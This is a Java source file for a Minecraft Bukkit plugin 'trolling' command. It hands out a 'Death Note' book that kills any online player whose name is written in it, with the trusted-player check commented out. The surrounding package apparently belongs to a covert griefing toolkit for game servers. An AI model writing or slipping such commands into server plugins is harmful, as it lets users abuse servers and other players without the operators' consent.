/**
 * The MIT License (MIT)
 *
 * Copyright (c) 2016 Garkolym
 * 
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 * 
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */
package de.Garkolym.Commands.Trolling;

import java.util.ArrayList;
import java.util.Arrays;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemFlag;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.BookMeta;
import org.bukkit.inventory.meta.ItemMeta;

import de.Garkolym.Start;
import de.Garkolym.Commands.Command;
import de.Garkolym.Commands.CommandCategory;
import de.Garkolym.Events.ITick;

/**
 * Gives the player a death note to write names in.
 * 
 * @see <a href="http://deathnote.wikia.com/wiki/Death_Note_(object)">Death Note</a>
 * @author Kage0x3B
 */
public class CommandDeathNote extends Command implements ITick {
	private ItemStack deathNote;

	public CommandDeathNote() {
		super("deathnote", CommandCategory.TROLLING);

		Start.instance.eventManager.tickListener.add(this);

		deathNote = new ItemStack(Material.BOOK_AND_QUILL);
		ItemMeta itemMeta = deathNote.getItemMeta();
		itemMeta.setDisplayName(ChatColor.DARK_RED + "Death Note");
		itemMeta.setLore(Arrays.asList("Wenn du den Namen einer Person in dieses Buch einträgst,", "wird diese innerhalb von 40 Sekunden sterben."));
		itemMeta.addEnchant(Enchantment.DAMAGE_ALL, 10, false);
		itemMeta.addItemFlags(ItemFlag.values());
		deathNote.setItemMeta(itemMeta);
	}

	@Override
	public void onCommand(Player p, ArrayList<String> args) {
		if(!p.getInventory().contains(deathNote)) {
			p.getInventory().addItem(deathNote.clone());
			p.sendMessage(Start.instance.prefix + ChatColor.GREEN + "You now have an own Death Note!");
		} else {
			p.sendMessage(Start.instance.prefix + ChatColor.RED + "You already have one");
		}
	}

	// The PlayerEditBookEvent doesnt work so Im checking every player every tick for a book and quill -.-

	@SuppressWarnings("deprecation")
	@Override
	public void onTick() {
		for(Player player : Bukkit.getOnlinePlayers()) {
			// If this is commented out, you can give the Death Note to other players and it will still work.
			// if(!Start.instance.getTrustedPlayers().contains(player.getName())) {
			// continue;
			// }

			// getItemOnCursor didnt work?! I guess I should update my spigot version soon.
			if(player.getItemInHand() != null && player.getItemInHand().getType() == Material.BOOK_AND_QUILL) {
				BookMeta bookMeta = (BookMeta) player.getItemInHand().getItemMeta();

				if(!bookMeta.hasPages()) {
					continue;
				}

				if(bookMeta.hasDisplayName() && bookMeta.getDisplayName().equals(ChatColor.DARK_RED + "Death Note")) {
					executeDeathNotes(bookMeta);

					player.setItemInHand(deathNote.clone());
				}
			}
		}
	}

	private void executeDeathNotes(BookMeta bookMeta) {
		if(!bookMeta.hasPages()) {
			return;
		}

		for(String page : bookMeta.getPages()) {
			for(String line : page.split("\n")) {
				Player player = Bukkit.getPlayer(line);

				if(player != null) {
					Bukkit.getScheduler().scheduleSyncDelayedTask(Start.instance, new Runnable() {
						public void run() {
							player.setHealth(0);
						}
					}, 40 * 20);
				}
			}
		}
	}
}